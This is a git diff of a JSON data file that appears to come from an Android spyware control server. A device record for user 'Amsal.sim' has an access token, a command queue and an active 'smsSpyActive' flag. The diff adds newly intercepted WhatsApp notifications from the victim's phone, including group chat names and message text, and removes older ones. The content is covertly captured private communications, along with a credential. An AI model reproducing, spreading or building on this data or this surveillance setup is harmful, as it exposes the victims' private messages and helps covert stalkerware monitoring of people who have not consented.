@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776003655289,
+    "lastSeen": 1776003662532,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
+        "content": "‎4 pesan baru",
+        "time": "12/04 21:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003663294
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (4 pesan): ~ 𝒜𝓋𝑒𝓁𝓎𝓃 𝒢𝓇𝒾𝓈𝑒𝓁𝒹𝒶 𝒱𝒶𝓁𝑒𝓇𝓎",
+        "content": "tapi betul kan?",
+        "time": "12/04 21:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003663150
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
+        "content": "‎3 pesan baru",
+        "time": "12/04 21:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003661036
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (3 pesan): ~ 你也太八卦了吧 ",
@@ -4099,30 +4123,6 @@
         "time": "12/04 05:21",
         "pkg": "com.whatsapp",
         "receivedAt": 1775946074752
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎8 pesan dari 3 chat",
-        "time": "12/04 05:05",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775945127025
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎7 pesan dari 3 chat",
-        "time": "12/04 04:36",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775943389408
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎6 pesan dari 3 chat",
-        "time": "12/04 04:36",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775943386705
       }
     ],
     "galleryPhotos": [],
